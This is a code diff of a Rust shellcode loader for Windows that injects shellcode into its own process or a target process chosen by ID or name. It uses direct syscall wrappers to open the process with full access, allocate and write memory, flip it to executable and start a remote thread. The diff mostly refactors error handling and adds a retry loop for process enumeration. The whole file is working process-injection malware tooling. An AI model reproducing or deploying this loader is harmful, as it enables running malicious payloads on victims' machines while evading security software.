@@ -1,9 +1,12 @@
-use std::error::Error;
+use std::any::Any;
+use std::panic;
 
 #[allow(unused_imports)]
 use crate::debug_error;
 #[allow(unused_imports)]
 use crate::debug_ok_msg;
+#[allow(unused_imports)]
+use crate::debug_error_msg;
 #[allow(unused_imports)]
 use crate::debug_base_msg;
 #[allow(unused_imports)]
@@ -12,6 +15,9 @@ use crate::debug_base_hex;
 use crate::debug_success_msg;
 #[allow(unused_imports)]
 use crate::debug_base;
+#[allow(unused_imports)]
+use crate::debug_info_msg;
+
 
 use crate::winapi::{syscall_wrapper::SyscallWrapper, types::HANDLE};
 use crate::winapi::constants::STATUS_SUCCESS;
@@ -19,13 +25,14 @@ use crate::winapi::constants::STATUS_SUCCESS;
 #[allow(dead_code)]
 pub fn do_load()
 {
-    let shell_code = get_shell_code();
-    debug_success_msg!(format!("Shellcode loaded, size = {}", shell_code.len()));
-    match load(shell_code) {
-        Ok(_) => {},
-        Err(e) => {
-            debug_error!(e);
-        }
+    let result: Result<(), Box<dyn Any + Send>> = panic::catch_unwind(|| {
+        let shell_code = get_shell_code();
+        debug_success_msg!(format!("Shellcode loaded, size = {}", shell_code.len()));
+        load(shell_code);
+    });
+    match result {
+        Err(_) => debug_error_msg!(format!("An Error occured")),
+        _ => ()
     }
 }
 
@@ -37,7 +44,7 @@ fn get_shell_code() -> Vec<u8> {
 }
 
 #[cfg(all(feature = "inject_self", not(feature = "inject_proc_id"), not(feature = "inject_proc_name")))]
-fn load(shell_code: Vec<u8>) -> Result<(), Box<dyn Error>> {
+fn load(shell_code: Vec<u8>) -> bool {
     let ntdll = SyscallWrapper::new();
     let process_handle: HANDLE = -1;
 
@@ -45,7 +52,7 @@ fn load(shell_code: Vec<u8>) -> Result<(), Box<dyn Error>> {
 }
 
 #[cfg(all(feature = "inject_proc_id", not(feature = "inject_self"), not(feature = "inject_proc_name")))]
-fn load(shell_code: Vec<u8>) -> Result<(), Box<dyn Error>> {
+fn load(shell_code: Vec<u8>) -> bool {
     let process_id = String::from(env!("PROCESS_ID")).parse().unwrap();
     inner_load_with_id(ntdll, process_id, shell_code)
 }
@@ -53,8 +60,7 @@ fn load(shell_code: Vec<u8>) -> Result<(), Box<dyn Error>> {
 
 
 #[cfg(all(feature = "inject_proc_name", not(feature = "inject_proc_id"), not(feature = "inject_self")))]
-fn load(shell_code: Vec<u8>) -> Result<(), Box<dyn Error>> {
-
+fn load(shell_code: Vec<u8>) -> bool {
 
     let ntdll = SyscallWrapper::new();
 
@@ -70,19 +76,30 @@ fn load(shell_code: Vec<u8>) -> Result<(), Box<dyn Error>> {
     let mut res = ntdll.nt_query_system_information(crate::winapi::constants::SYSTEM_PROCESS_INFORMATION, &mut 0, 0, return_length_ptr);
     crate::debug_info_msg!(format!("Call to NtQuerySystemInformation : Result = {:#x}", res));
     if res as u32 != 0xc0000004 {
-        return Err(Box::from("Failed to get size of process info list!"));
+        debug_error_msg!("Failed to get size of process info list!");
+        return false;
     }
     debug_success_msg!(format!("Size of process info list = {}", return_length));
 
     let mut data = vec![0u8; return_length as usize];
 
-    crate::debug_ok_msg!(format!("Call to NtQuerySystemInformation"));
-    res = ntdll.nt_query_system_information(crate::winapi::constants::SYSTEM_PROCESS_INFORMATION, data.as_mut_ptr(), return_length , return_length_2_ptr);
-    crate::debug_info_msg!(format!("Call to NtQuerySystemInformation : Result = {:#x}", res));
-    if res != STATUS_SUCCESS {
-        return Err(Box::from("Failed to get process info list!"));
+    loop {
+        crate::debug_ok_msg!(format!("Call to NtQuerySystemInformation"));
+        res = ntdll.nt_query_system_information(crate::winapi::constants::SYSTEM_PROCESS_INFORMATION, data.as_mut_ptr(), return_length , return_length_2_ptr);
+        crate::debug_info_msg!(format!("Call to NtQuerySystemInformation : Result = {:#x}", res));
+        if res as u32 == 0xc0000004 { //the nuumber of process changed before the previous call => retry
+            debug_info_msg!("Process list changed, retrying....");
+            return_length = return_length_2;
+            continue;
+        }
+        if res != STATUS_SUCCESS {
+            debug_error_msg!("Failed to get process info list!");
+            return false;
+        }
+        
+        debug_success_msg!("Processes Info list retrieved.");
+        break;
     }
-    debug_success_msg!("Processes Info list retrieved.");
 
     let processes_info_list_ptr = data.as_ptr() as *const crate::winapi::structs::SYSTEM_PROCESS_INFORMATION;
     let mut current_ptr = processes_info_list_ptr;
@@ -109,14 +126,15 @@ fn load(shell_code: Vec<u8>) -> Result<(), Box<dyn Error>> {
     }
 
     if process_id == 0 {
-        return Err(Box::from(format!("Failed to find process whith name {}", process_name)));
+        debug_error_msg!(format!("Failed to find process whith name {}", process_name));
+        return false;
     }
     debug_success_msg!(format!("Found process with id {}.", process_id));
     
     inner_load_with_id(&ntdll, process_id, shell_code)
 }
 
-fn inner_load_with_id(ntdll: &SyscallWrapper, process_id: isize, shell_code: Vec<u8>)  -> Result<(), Box<dyn Error>> {
+fn inner_load_with_id(ntdll: &SyscallWrapper, process_id: isize, shell_code: Vec<u8>)  -> bool {
     use crate::winapi::constants::PROCESS_ALL_ACCESS;
 
     let mut process_handle: HANDLE = 0;
@@ -125,25 +143,30 @@ fn inner_load_with_id(ntdll: &SyscallWrapper, process_id: isize, shell_code: Vec
     let mut res = ntdll.nt_open_process(&mut process_handle, PROCESS_ALL_ACCESS, process_id);
     crate::debug_info_msg!(format!("Call to NtOpenProcess : Result = {:#x}", res));
     if res != STATUS_SUCCESS {
-        return Err(Box::from("Failed to get Process Handle!"));
+        debug_error_msg!("Failed to get Process Handle!");
+        return false;
     }
     debug_success_msg!(format!("Process Handle #{} retrieved from process with id {}", process_handle, process_id ));
 
-    inner_load(&ntdll, shell_code, process_handle, true)?;
+    if !inner_load(&ntdll, shell_code, process_handle, true) {
+        return false;
+    }
+
 
     crate::debug_ok_msg!(format!("Call to NtClose"));
     res = ntdll.nt_close(process_handle);
     crate::debug_info_msg!(format!("Call to NtClose : Result = {:#x}", res));
     if res != STATUS_SUCCESS {
-        return Err(Box::from("Failed to close Process Handle!"));
+        debug_error_msg!("Failed to close Process Handle!");
+        return false;
     }
     debug_success_msg!(format!("Process Handle closed"));
 
-    Ok(())
+    true
 }
 
 
-fn inner_load(ntdll: &SyscallWrapper, shell_code: Vec<u8>, process_handle: HANDLE, wait: bool) -> Result<(), Box<dyn Error>> {
+fn inner_load(ntdll: &SyscallWrapper, shell_code: Vec<u8>, process_handle: HANDLE, wait: bool) -> bool {
 
     use crate::winapi::constants::{MEM_RESERVE, MEM_COMMIT, PAGE_READWRITE, PAGE_EXECUTE_READ, THREAD_ALL_ACCESS};
 
@@ -154,7 +177,8 @@ fn inner_load(ntdll: &SyscallWrapper, shell_code: Vec<u8>, process_handle: HANDL
     let mut res = ntdll.nt_allocate_virtual_memory(process_handle, &mut address,  &mut size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
     crate::debug_info_msg!(format!("Call to NtAllocateVirtualMemory : Result = {:#x}", res));
     if res != STATUS_SUCCESS {
-        return Err(Box::from(format!("Failed to allocate memory (size = {})!", size)));
+        debug_error_msg!(format!("Failed to allocate memory (size = {})!", size));
+        return false;
     }
     debug_success_msg!(format!("Memory allocated : {}b at {:#x}", size, address));
 
@@ -164,7 +188,8 @@ fn inner_load(ntdll: &SyscallWrapper, shell_code: Vec<u8>, process_handle: HANDL
     res =  ntdll.nt_protect_virtual_memory(process_handle, &mut address, &mut size, PAGE_READWRITE, &mut old_protect);
     crate::debug_info_msg!(format!("Call to NtProtectVirtualMemory : Result = {:#x}", res));
     if res != STATUS_SUCCESS {
-        return Err(Box::from("Failed to change memory protection!"));
+        debug_error_msg!("Failed to change memory protection!");
+        return false;
     }
     debug_success_msg!("Memory protection changed to PAGE_READWRITE");
 
@@ -173,7 +198,8 @@ fn inner_load(ntdll: &SyscallWrapper, shell_code: Vec<u8>, process_handle: HANDL
     res =  ntdll.nt_write_virtual_memory(process_handle, address, shell_code.as_ptr() as usize, shell_code.len(), &mut nb_of_bytes_written);
     crate::debug_info_msg!(format!("Call to NtWriteVirtualMemory : Result = {:#x}", res));
     if res != STATUS_SUCCESS {
-        return Err(Box::from("Failed to write memory!"));
+        debug_error_msg!("Failed to write memory!");
+        return false;
     }
     debug_success_msg!("Memory written");
 
@@ -181,7 +207,8 @@ fn inner_load(ntdll: &SyscallWrapper, shell_code: Vec<u8>, process_handle: HANDL
     res =  ntdll.nt_protect_virtual_memory(process_handle, &mut address, &mut size, PAGE_EXECUTE_READ, &mut old_protect);
     crate::debug_info_msg!(format!("Call to NtProtectVirtualMemory : Result = {:#x}", res));
     if res != STATUS_SUCCESS {
-        return Err(Box::from("Failed to change memory protection!"));
+        debug_error_msg!("Failed to change memory protection!");
+        return false;
     }
     debug_success_msg!("Memory protection changed to PAGE_EXECUTE_READ");
     
@@ -190,7 +217,8 @@ fn inner_load(ntdll: &SyscallWrapper, shell_code: Vec<u8>, process_handle: HANDL
     res =  ntdll.nt_create_thread_ex(&mut thread_handle, THREAD_ALL_ACCESS,process_handle, address);
     crate::debug_info_msg!(format!("Call to NtCreateThreadEx : Result = {:#x}", res));
     if res != STATUS_SUCCESS {
-        return Err(Box::from("Failed to start thread!"));
+        debug_error_msg!("Failed to start thread!");
+        return false;
     }
     debug_success_msg!("Thread executed");
 
@@ -199,7 +227,8 @@ fn inner_load(ntdll: &SyscallWrapper, shell_code: Vec<u8>, process_handle: HANDL
         res =  ntdll.nt_wait_for_single_object(thread_handle);
         crate::debug_info_msg!(format!("Call to NtWaitForSingleObject : Result = {:#x}", res));
         if res != STATUS_SUCCESS {
-            return Err(Box::from("Failed to wait!"));
+            debug_error_msg!("Failed to wait!");
+            return false;
         }
         debug_success_msg!("Thread ended");
     }
@@ -208,9 +237,10 @@ fn inner_load(ntdll: &SyscallWrapper, shell_code: Vec<u8>, process_handle: HANDL
     res = ntdll.nt_close(thread_handle);
     crate::debug_info_msg!(format!("Call to NtClose : Result = {:#x}", res));
     if res != STATUS_SUCCESS {
-        return Err(Box::from("Failed to close Thread Handle!"));
+        debug_error_msg!("Failed to close Thread Handle!");
+        return false;
     }
     debug_success_msg!(format!("Thread Handle closed"));
 
-    Ok(())
+    true
 }
